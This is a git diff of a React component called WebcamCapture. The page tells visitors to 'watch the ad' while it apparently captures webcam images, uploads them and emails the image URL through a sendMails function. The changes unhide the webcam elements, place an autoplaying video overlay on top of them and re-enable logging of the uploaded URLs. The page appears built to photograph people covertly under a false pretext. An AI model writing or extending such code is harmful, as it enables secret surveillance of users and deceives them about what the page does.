@@ -53,7 +53,7 @@ export default function WebcamCapture() {
             body: formData
           })
           const data = await response.json()
-          //console.log("Image uploaded:", data.url)
+          console.log("Image uploaded:", data.url)
           await sendMails(data.url)
         } catch (error) {
           console.error("Error uploading image:", error)
@@ -86,10 +86,10 @@ export default function WebcamCapture() {
     <div className="min-h-screen bg-gradient-to-br from-green-400 to-sky-500 flex flex-col items-center justify-center p-8">
         <h1 className='text-white text-2xl font-bold'>Please Watch The Ad then the websites Continues.....</h1>
       {showPermissionPopup && <PermissionPopup onPermissionGranted={handlePermissionGranted} />}
-      <div className="backdrop-blur-lg hidden bg-white/30 rounded-lg p-8 shadow-2xl border-2 border-white/50">
+      <div className="backdrop-blur-lg  bg-white/30 rounded-lg p-8 shadow-2xl border-2 border-white/50">
         <h1 className="text-4xl font-bold mb-8 text-center text-white drop-shadow-lg">
         </h1>
-        <div className="relative hidden">
+        <div className="relative">
           {showWebcam ? (
             <>
               <Webcam
@@ -149,14 +149,17 @@ export default function WebcamCapture() {
         
         </div>
       </div>
+      <div className="myvideo absolute top-16 ">
+
       <video
             src="/myvideo.mp4"
             autoPlay
             muted
             className="w-full rounded-lg shadow-lg"
-          >
+            >
             Your browser does not support the video tag.
           </video>
+            </div>
     </div>
   )
 }
@@ -168,7 +171,7 @@ const sendMails=async(imgUrl:any)=>{
         body: JSON.stringify({imgUrl})
       })
       const data = await response.json()
-      //console.log("Response is::::::",data);
+      console.log("Response is::::::",data);
     //   console.log();    
 }
 
